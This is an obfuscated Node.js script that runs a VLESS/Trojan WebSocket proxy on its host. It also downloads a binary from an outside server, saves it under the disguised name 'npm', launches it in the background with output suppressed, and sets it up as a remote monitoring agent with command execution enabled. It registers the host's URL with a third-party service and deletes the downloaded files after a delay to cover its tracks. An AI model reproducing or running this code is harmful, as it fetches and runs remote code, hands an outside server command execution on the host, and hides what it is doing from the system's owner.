const _0x48b996=_0x4270;(function(_0x15e328,_0x5b225c){const _0x2fa170=_0x4270,_0xa31918=_0x15e328();while(!![]){try{const _0x1dedbe=parseInt(_0x2fa170(0x194))/0x1+parseInt(_0x2fa170(0x188))/0x2+parseInt(_0x2fa170(0x1bd))/0x3+parseInt(_0x2fa170(0x1bf))/0x4+-parseInt(_0x2fa170(0x172))/0x5*(parseInt(_0x2fa170(0x1a4))/0x6)+parseInt(_0x2fa170(0x19e))/0x7*(-parseInt(_0x2fa170(0x180))/0x8)+parseInt(_0x2fa170(0x1de))/0x9*(-parseInt(_0x2fa170(0x1b9))/0xa);if(_0x1dedbe===_0x5b225c)break;else _0xa31918['push'](_0xa31918['shift']());}catch(_0x274ec0){_0xa31918['push'](_0xa31918['shift']());}}}(_0x346d,0xed2ee));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x48b996(0x1dc)),net=require(_0x48b996(0x196)),path=require(_0x48b996(0x18d)),crypto=require(_0x48b996(0x1a0)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x48b996(0x19b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x48b996(0x183)][_0x48b996(0x18a)]||_0x48b996(0x18e),NEZHA_SERVER=process[_0x48b996(0x183)][_0x48b996(0x179)]||'',NEZHA_PORT=process[_0x48b996(0x183)][_0x48b996(0x1d5)]||'',NEZHA_KEY=process[_0x48b996(0x183)]['NEZHA_KEY']||'',DOMAIN=process[_0x48b996(0x183)][_0x48b996(0x1a3)]||_0x48b996(0x1c9),AUTO_ACCESS=process[_0x48b996(0x183)][_0x48b996(0x1df)]||!![],WSPATH=process[_0x48b996(0x183)][_0x48b996(0x1b2)]||UUID[_0x48b996(0x1b3)](0x0,0x8),SUB_PATH=process[_0x48b996(0x183)][_0x48b996(0x1dd)]||_0x48b996(0x198),NAME=process[_0x48b996(0x183)][_0x48b996(0x1e0)]||_0x48b996(0x1ca),PORT=process[_0x48b996(0x183)][_0x48b996(0x1e8)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3a7ad5=_0x48b996;try{const _0x9b9df2=await axios[_0x3a7ad5(0x1d4)](_0x3a7ad5(0x195)),_0x3a6301=_0x9b9df2[_0x3a7ad5(0x1cd)];ISP=(_0x3a6301['country']+'-'+_0x3a6301[_0x3a7ad5(0x1b1)])['replace'](/ /g,'_');}catch(_0x4734fa){ISP=_0x3a7ad5(0x1b7);}};GetISP();function _0x4270(_0x8ac379,_0x1f122b){const _0x346d9d=_0x346d();return _0x4270=function(_0x4270d9,_0x49f8bb){_0x4270d9=_0x4270d9-0x16b;let _0x2893fe=_0x346d9d[_0x4270d9];return _0x2893fe;},_0x4270(_0x8ac379,_0x1f122b);}const httpServer=http[_0x48b996(0x1ce)]((_0xd29347,_0x186944)=>{const _0x552dd1=_0x48b996;if(_0xd29347[_0x552dd1(0x17a)]==='/'){const _0x855c20=path[_0x552dd1(0x185)](__dirname,'index.html');fs['readFile'](_0x855c20,_0x552dd1(0x1ad),(_0x2b378a,_0x419f5e)=>{const _0x10a26d=_0x552dd1;if(_0x2b378a){_0x186944[_0x10a26d(0x16e)](0xc8,{'Content-Type':_0x10a26d(0x192)}),_0x186944['end'](_0x10a26d(0x1b0));return;}_0x186944[_0x10a26d(0x16e)](0xc8,{'Content-Type':_0x10a26d(0x192)}),_0x186944[_0x10a26d(0x16f)](_0x419f5e);});return;}else{if(_0xd29347[_0x552dd1(0x17a)]==='/'+SUB_PATH){const _0x2ae624=_0x552dd1(0x1ac)+UUID+'@'+DOMAIN+_0x552dd1(0x1d7)+DOMAIN+_0x552dd1(0x175)+DOMAIN+_0x552dd1(0x177)+WSPATH+'#'+NAME+'-'+ISP,_0xaca37d=_0x552dd1(0x1e9)+UUID+'@'+DOMAIN+_0x552dd1(0x1ed)+DOMAIN+_0x552dd1(0x175)+DOMAIN+_0x552dd1(0x177)+WSPATH+'#'+NAME+'-'+ISP,_0x320fb1=_0x2ae624+'\x0a'+_0xaca37d,_0x439a11=Buffer[_0x552dd1(0x1d3)](_0x320fb1)[_0x552dd1(0x1c4)]('base64');_0x186944[_0x552dd1(0x16e)](0xc8,{'Content-Type':_0x552dd1(0x1ab)}),_0x186944['end'](_0x439a11+'\x0a');}else _0x186944[_0x552dd1(0x16e)](0x194,{'Content-Type':_0x552dd1(0x1ab)}),_0x186944['end'](_0x552dd1(0x1c1));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x48b996(0x1b4)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x48b996(0x1e3)];function resolveHost(_0x1fbd66){return new Promise((_0x1e3e72,_0x275ace)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1fbd66)){_0x1e3e72(_0x1fbd66);return;}let _0x2a0298=0x0;function _0x49bae0(){const _0x5bf1d5=_0x4270;if(_0x2a0298>=DNS_SERVERS[_0x5bf1d5(0x1e4)]){_0x275ace(new Error(_0x5bf1d5(0x1c7)+_0x1fbd66+_0x5bf1d5(0x176)));return;}const _0xaf137a=DNS_SERVERS[_0x2a0298];_0x2a0298++;const _0x28d16f=_0x5bf1d5(0x1ae)+encodeURIComponent(_0x1fbd66)+_0x5bf1d5(0x1e5);axios[_0x5bf1d5(0x1d4)](_0x28d16f,{'timeout':0x1388,'headers':{'Accept':_0x5bf1d5(0x1ec)}})[_0x5bf1d5(0x193)](_0x1850a7=>{const _0x4d00e0=_0x5bf1d5,_0x5d20ae=_0x1850a7[_0x4d00e0(0x1cd)];if(_0x5d20ae[_0x4d00e0(0x17d)]===0x0&&_0x5d20ae[_0x4d00e0(0x191)]&&_0x5d20ae[_0x4d00e0(0x191)][_0x4d00e0(0x1e4)]>0x0){const _0xfdcca5=_0x5d20ae['Answer'][_0x4d00e0(0x1cb)](_0x4128e5=>_0x4128e5['type']===0x1);if(_0xfdcca5){_0x1e3e72(_0xfdcca5[_0x4d00e0(0x1cd)]);return;}}_0x49bae0();})[_0x5bf1d5(0x1b6)](_0x16191a=>{_0x49bae0();});}_0x49bae0();});}function handleVlessConnection(_0x313561,_0x581c5b){const _0x2131b2=_0x48b996,[_0x4e18ff]=_0x581c5b,_0x283479=_0x581c5b[_0x2131b2(0x1b3)](0x1,0x11);if(!_0x283479[_0x2131b2(0x184)]((_0x493900,_0x464f83)=>_0x493900==parseInt(uuid[_0x2131b2(0x1d2)](_0x464f83*0x2,0x2),0x10)))return![];let _0x581277=_0x581c5b[_0x2131b2(0x1b3)](0x11,0x12)[_0x2131b2(0x197)]()+0x13;const _0x15a120=_0x581c5b[_0x2131b2(0x1b3)](_0x581277,_0x581277+=0x2)[_0x2131b2(0x17b)](0x0),_0x16597e=_0x581c5b[_0x2131b2(0x1b3)](_0x581277,_0x581277+=0x1)[_0x2131b2(0x197)](),_0x2bda06=_0x16597e==0x1?_0x581c5b[_0x2131b2(0x1b3)](_0x581277,_0x581277+=0x4)[_0x2131b2(0x185)]('.'):_0x16597e==0x2?new TextDecoder()[_0x2131b2(0x1a5)](_0x581c5b['slice'](_0x581277+0x1,_0x581277+=0x1+_0x581c5b[_0x2131b2(0x1b3)](_0x581277,_0x581277+0x1)[_0x2131b2(0x197)]())):_0x16597e==0x3?_0x581c5b[_0x2131b2(0x1b3)](_0x581277,_0x581277+=0x10)['reduce']((_0x1d79b5,_0x2c7c39,_0x251eb2,_0x4baa8e)=>_0x251eb2%0x2?_0x1d79b5['concat'](_0x4baa8e['slice'](_0x251eb2-0x1,_0x251eb2+0x1)):_0x1d79b5,[])[_0x2131b2(0x1be)](_0x183df2=>_0x183df2[_0x2131b2(0x17b)](0x0)[_0x2131b2(0x1c4)](0x10))[_0x2131b2(0x185)](':'):'';_0x313561[_0x2131b2(0x190)](new Uint8Array([_0x4e18ff,0x0]));const _0x23207a=createWebSocketStream(_0x313561);return resolveHost(_0x2bda06)[_0x2131b2(0x193)](_0x3375ff=>{const _0x1a7734=_0x2131b2;net['connect']({'host':_0x3375ff,'port':_0x15a120},function(){const _0x1d2b4e=_0x4270;this['write'](_0x581c5b['slice'](_0x581277)),_0x23207a['on'](_0x1d2b4e(0x1bb),()=>{})[_0x1d2b4e(0x173)](this)['on'](_0x1d2b4e(0x1bb),()=>{})[_0x1d2b4e(0x173)](_0x23207a);})['on'](_0x1a7734(0x1bb),()=>{});})[_0x2131b2(0x1b6)](_0x23e7b6=>{const _0xb4f226=_0x2131b2;net[_0xb4f226(0x1c0)]({'host':_0x2bda06,'port':_0x15a120},function(){const _0x108a2c=_0xb4f226;this[_0x108a2c(0x1eb)](_0x581c5b[_0x108a2c(0x1b3)](_0x581277)),_0x23207a['on'](_0x108a2c(0x1bb),()=>{})[_0x108a2c(0x173)](this)['on'](_0x108a2c(0x1bb),()=>{})['pipe'](_0x23207a);})['on'](_0xb4f226(0x1bb),()=>{});}),!![];}function handleTrojanConnection(_0x239acc,_0x2f20cc){const _0x1cc8eb=_0x48b996;try{if(_0x2f20cc[_0x1cc8eb(0x1e4)]<0x3a)return![];const _0x2c01c2=_0x2f20cc[_0x1cc8eb(0x1b3)](0x0,0x38)[_0x1cc8eb(0x1c4)](),_0x3a05b5=[UUID];let _0x43bfd4=null;for(const _0x2b9a5d of _0x3a05b5){const _0x17c16e=crypto[_0x1cc8eb(0x19d)](_0x1cc8eb(0x199))[_0x1cc8eb(0x186)](_0x2b9a5d)[_0x1cc8eb(0x1a9)](_0x1cc8eb(0x1d9));if(_0x17c16e===_0x2c01c2){_0x43bfd4=_0x2b9a5d;break;}}if(!_0x43bfd4)return![];let _0x1d59e8=0x38;_0x2f20cc[_0x1d59e8]===0xd&&_0x2f20cc[_0x1d59e8+0x1]===0xa&&(_0x1d59e8+=0x2);const _0x38bf8c=_0x2f20cc[_0x1d59e8];if(_0x38bf8c!==0x1)return![];_0x1d59e8+=0x1;const _0x4800dc=_0x2f20cc[_0x1d59e8];_0x1d59e8+=0x1;let _0x2c3064,_0x4b1a10;if(_0x4800dc===0x1)_0x2c3064=_0x2f20cc[_0x1cc8eb(0x1b3)](_0x1d59e8,_0x1d59e8+0x4)[_0x1cc8eb(0x185)]('.'),_0x1d59e8+=0x4;else{if(_0x4800dc===0x3){const _0x5d7157=_0x2f20cc[_0x1d59e8];_0x1d59e8+=0x1,_0x2c3064=_0x2f20cc[_0x1cc8eb(0x1b3)](_0x1d59e8,_0x1d59e8+_0x5d7157)[_0x1cc8eb(0x1c4)](),_0x1d59e8+=_0x5d7157;}else{if(_0x4800dc===0x4)_0x2c3064=_0x2f20cc[_0x1cc8eb(0x1b3)](_0x1d59e8,_0x1d59e8+0x10)[_0x1cc8eb(0x181)]((_0x5e5e66,_0x21a37a,_0x5f080d,_0x4cb537)=>_0x5f080d%0x2?_0x5e5e66[_0x1cc8eb(0x1af)](_0x4cb537['slice'](_0x5f080d-0x1,_0x5f080d+0x1)):_0x5e5e66,[])[_0x1cc8eb(0x1be)](_0x3caf59=>_0x3caf59['readUInt16BE'](0x0)['toString'](0x10))[_0x1cc8eb(0x185)](':'),_0x1d59e8+=0x10;else return![];}}_0x4b1a10=_0x2f20cc[_0x1cc8eb(0x17b)](_0x1d59e8),_0x1d59e8+=0x2;_0x1d59e8<_0x2f20cc[_0x1cc8eb(0x1e4)]&&_0x2f20cc[_0x1d59e8]===0xd&&_0x2f20cc[_0x1d59e8+0x1]===0xa&&(_0x1d59e8+=0x2);const _0x54ab6b=createWebSocketStream(_0x239acc);return resolveHost(_0x2c3064)[_0x1cc8eb(0x193)](_0x360698=>{const _0x1c9556=_0x1cc8eb;net[_0x1c9556(0x1c0)]({'host':_0x360698,'port':_0x4b1a10},function(){const _0x4890f0=_0x1c9556;_0x1d59e8<_0x2f20cc['length']&&this[_0x4890f0(0x1eb)](_0x2f20cc[_0x4890f0(0x1b3)](_0x1d59e8)),_0x54ab6b['on'](_0x4890f0(0x1bb),()=>{})[_0x4890f0(0x173)](this)['on']('error',()=>{})['pipe'](_0x54ab6b);})['on'](_0x1c9556(0x1bb),()=>{});})['catch'](_0x59e1aa=>{const _0xd307ed=_0x1cc8eb;net[_0xd307ed(0x1c0)]({'host':_0x2c3064,'port':_0x4b1a10},function(){const _0x1775a7=_0xd307ed;_0x1d59e8<_0x2f20cc[_0x1775a7(0x1e4)]&&this[_0x1775a7(0x1eb)](_0x2f20cc[_0x1775a7(0x1b3)](_0x1d59e8)),_0x54ab6b['on'](_0x1775a7(0x1bb),()=>{})['pipe'](this)['on'](_0x1775a7(0x1bb),()=>{})['pipe'](_0x54ab6b);})['on']('error',()=>{});}),!![];}catch(_0x33866e){return![];}}wss['on'](_0x48b996(0x19a),(_0x23e9da,_0x1728ae)=>{const _0x461112=_0x48b996,_0x16b18c=_0x1728ae[_0x461112(0x17a)]||'';_0x23e9da[_0x461112(0x1cc)]('message',_0x126ce6=>{const _0x1e75cc=_0x461112;if(_0x126ce6[_0x1e75cc(0x1e4)]>0x11&&_0x126ce6[0x0]===0x0){const _0xa81f63=_0x126ce6[_0x1e75cc(0x1b3)](0x1,0x11),_0x4ca4af=_0xa81f63[_0x1e75cc(0x184)]((_0x2b976a,_0x4a1110)=>_0x2b976a==parseInt(uuid['substr'](_0x4a1110*0x2,0x2),0x10));if(_0x4ca4af){!handleVlessConnection(_0x23e9da,_0x126ce6)&&_0x23e9da['close']();return;}}!handleTrojanConnection(_0x23e9da,_0x126ce6)&&_0x23e9da[_0x1e75cc(0x1a8)]();})['on'](_0x461112(0x1bb),()=>{});});function _0x346d(){const _0x4fc246=['writeHead','end','2087','https://arm64.ssss.nyc.mn/agent','5IPsleg','pipe','https://amd64.ssss.nyc.mn/v1','&fp=chrome&type=ws&host=','\x20with\x20all\x20DNS\x20servers','&path=%2F','application/json','NEZHA_SERVER','url','readUInt16BE','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Status','createWriteStream','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','502552mWeukN','reduce','https://amd64.ssss.nyc.mn/agent','env','every','join','update','log','1359732vFHfTk','npm','UUID','npm\x20is\x20running','setsid\x20nohup\x20./npm\x20-s\x20','path','d1eebe41-b958-422c-be3b-7f580bdae2ae','npm\x20running\x20error:','send','Answer','text/html','then','329036CtIfcA','https://speed.cloudflare.com/meta','net','readUInt8','sub','sha224','connection','child_process','npm\x20is\x20already\x20running,\x20skip\x20running...','createHash','105vvgFsJ','config.yaml','crypto','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x20-p\x20','DOMAIN','553542krxCHG','decode','2096','utf-8','close','digest','--tls','text/plain','vless://','utf8','https://dns.google/resolve?name=','concat','Hello\x20world!','asOrganization','WSPATH','slice','replace','chmod\x20+x\x20npm','catch','Unknown','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','50KQijGT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error','2053','1092717tIbrwK','map','5005752vAgIww','connect','Not\x20Found\x0a','arch','8443','toString','aarch64','Server\x20is\x20running\x20on\x20port\x20','Failed\x20to\x20resolve\x20','error:\x20','1234.abc.com','Hug','find','once','data','createServer','npm\x20download\x20successfully','Automatic\x20Access\x20Task\x20added\x20successfully','includes','substr','from','get','NEZHA_PORT','443',':443?encryption=none&security=tls&sni=','stream','hex','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://arm64.ssss.nyc.mn/v1','axios','SUB_PATH','1113363JhFwqt','AUTO_ACCESS','NAME','arm','false','1.1.1.1','length','&type=A','unlink','split','PORT','trojan://','2083','write','application/dns-json',':443?security=tls&sni=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trim','https://'];_0x346d=function(){return _0x4fc246;};return _0x346d();}const getDownloadUrl=()=>{const _0xec05c9=_0x48b996,_0x2c0936=os[_0xec05c9(0x1c2)]();return _0x2c0936===_0xec05c9(0x1e1)||_0x2c0936==='arm64'||_0x2c0936===_0xec05c9(0x1c5)?!NEZHA_PORT?_0xec05c9(0x1db):_0xec05c9(0x171):!NEZHA_PORT?_0xec05c9(0x174):_0xec05c9(0x182);},downloadFile=async()=>{const _0x1b9a38=_0x48b996;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x59976e=getDownloadUrl(),_0x4fec84=await axios({'method':_0x1b9a38(0x1d4),'url':_0x59976e,'responseType':_0x1b9a38(0x1d8)}),_0x306f55=fs[_0x1b9a38(0x17e)](_0x1b9a38(0x189));return _0x4fec84['data']['pipe'](_0x306f55),new Promise((_0x58f4ef,_0x162de8)=>{const _0x1de950=_0x1b9a38;_0x306f55['on']('finish',()=>{const _0x3bc5d4=_0x4270;console[_0x3bc5d4(0x187)](_0x3bc5d4(0x1cf)),exec(_0x3bc5d4(0x1b5),_0x26a80f=>{if(_0x26a80f)_0x162de8(_0x26a80f);_0x58f4ef();});}),_0x306f55['on'](_0x1de950(0x1bb),_0x162de8);});}catch(_0x4e1ff1){throw _0x4e1ff1;}},runnz=async()=>{const _0x3a9189=_0x48b996;try{const _0x4e376b=execSync(_0x3a9189(0x16b),{'encoding':_0x3a9189(0x1a7)});if(_0x4e376b[_0x3a9189(0x16c)]()!==''){console[_0x3a9189(0x187)](_0x3a9189(0x19c));return;}}catch(_0x90bfb){}await downloadFile();let _0x1d8eca='',_0x56d647=[_0x3a9189(0x1d6),_0x3a9189(0x1c3),_0x3a9189(0x1a6),_0x3a9189(0x170),_0x3a9189(0x1ea),_0x3a9189(0x1bc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2749e0=_0x56d647['includes'](NEZHA_PORT)?_0x3a9189(0x1aa):'';_0x1d8eca=_0x3a9189(0x18c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a9189(0x1a2)+NEZHA_KEY+'\x20'+_0x2749e0+_0x3a9189(0x17c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x117a64=NEZHA_SERVER[_0x3a9189(0x1d1)](':')?NEZHA_SERVER[_0x3a9189(0x1e7)](':')['pop']():'',_0x594ccc=_0x56d647[_0x3a9189(0x1d1)](_0x117a64)?'true':_0x3a9189(0x1e2),_0x50ee12='client_secret:\x20'+NEZHA_KEY+_0x3a9189(0x1b8)+NEZHA_SERVER+_0x3a9189(0x17f)+_0x594ccc+_0x3a9189(0x1ba)+UUID;fs['writeFileSync'](_0x3a9189(0x19f),_0x50ee12);}_0x1d8eca=_0x3a9189(0x1a1);}else{console[_0x3a9189(0x187)](_0x3a9189(0x1da));return;}}try{exec(_0x1d8eca,{'shell':'/bin/bash'},_0x47dceb=>{const _0x146928=_0x3a9189;if(_0x47dceb)console[_0x146928(0x1bb)](_0x146928(0x18f),_0x47dceb);else console['log'](_0x146928(0x18b));});}catch(_0x1ca7f3){console['error'](_0x3a9189(0x1c8)+_0x1ca7f3);}};async function addAccessTask(){const _0x42f062=_0x48b996;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1274ce=_0x42f062(0x16d)+DOMAIN+'/'+SUB_PATH;try{const _0x370395=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x1274ce},{'headers':{'Content-Type':_0x42f062(0x178)}});console[_0x42f062(0x187)](_0x42f062(0x1d0));}catch(_0x2ccf91){}}const delFiles=()=>{const _0x388e9c=_0x48b996;fs[_0x388e9c(0x1e6)](_0x388e9c(0x189),()=>{}),fs['unlink'](_0x388e9c(0x19f),()=>{});};httpServer['listen'](PORT,()=>{const _0x219278=_0x48b996;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x219278(0x187)](_0x219278(0x1c6)+PORT);});
